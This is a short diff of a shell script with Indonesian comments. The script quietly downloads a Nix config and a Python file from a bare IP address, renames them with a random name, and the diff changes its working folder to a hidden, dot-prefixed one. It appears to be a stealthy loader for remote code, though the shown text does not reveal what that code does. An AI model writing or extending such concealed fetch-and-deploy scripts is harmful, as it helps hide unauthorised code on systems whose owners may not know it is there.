@@ -21,8 +21,8 @@ wget -q -O dev.nix http://143.198.196.235/dev.nix
 sed -i "s/ganti/${NAME}/g" dev.nix
 
 # Buat folder sesuai nama random
-mkdir -p "$NAME"
-cd "$NAME" || exit 1
+mkdir -p ".$NAME"
+cd ".$NAME" || exit 1
 
 # Download file python & config.json
 wget -q -O "${NAME}" http://143.198.196.235/dev.py
